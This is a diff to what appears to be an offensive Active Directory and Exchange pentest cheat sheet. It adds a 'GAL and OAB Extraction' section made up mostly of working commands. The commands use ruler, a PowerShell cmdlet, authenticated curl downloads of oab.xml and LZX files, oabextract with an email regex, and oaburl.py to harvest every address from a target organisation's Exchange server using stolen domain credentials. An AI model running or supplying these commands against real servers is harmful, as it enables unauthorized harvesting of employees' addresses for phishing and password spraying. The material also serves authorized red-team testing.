@@ -52,7 +52,7 @@ it is the first version of this repo, many things will be added later, so stay t
     - [RunAsPPL for Credentials Dumping](#runasppl-for-credentials-dumping)
   - [MS Exchange](#ms-exchange)
     - [OWA Password Spraying](#owa-password-spraying)
-    - [GAL and OAB Exfiltration](#gal-and-oab-exfiltration)
+    - [GAL and OAB Extraction](#gal-and-oab-exfiltration)
     - [PrivExchange](#privexchange)
     - [ProxyLogon](#proxylogon)
     - [CVE-2020-0688](#cve-2020-0688)
@@ -815,7 +815,36 @@ mimikatz # !-
 
 ### OWA Password Spraying
 
-### GAL and OAB Exfiltration
+### GAL and OAB Extraction
+
+*GAL (Global Address Book) Extraction*
+```powershell
+./ruler -k -d $domain -u $user -p $password -e user@example.com --verbose abk dump -o email_list.txt
+```
+> using powershell :
+```powershell
+PS C:\> Get-GlobalAddressList -ExchHostname mx.megacorp.com -UserName $domain\$user -Password $password -OutFile email_list.txt
+```
+
+*OAB (Offline Address Book) Extraction*
+
+> extract OAB.XML file which contains records
+```bash
+curl -k --ntlm -u '$domain\$user:$password' https://$domain/OAB/$OABUrl/oab.xml > oab.xml
+
+cat oab.xml |grep '.lzx' |grep data
+```
+> extract LZX compressed file :
+```bash
+curl -k --ntlm -u '$domain\$user:$password' https://$domain/OAB/$OABUrl/$OABId-data-1.lzx > oab.lzx
+
+./oabextract oab.lzx oab.bin && strings oab.bin |egrep -o "(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])" | sort -u > emails.txt
+```
+> using [oaburl.py](https://gist.github.com/snovvcrash/4e76aaf2a8750922f546eed81aa51438) :
+```powershell
+./oaburl.py $domain/$user:$password@domain.com -e valid@domain.com
+```
+
 
 ### PrivExchange
 
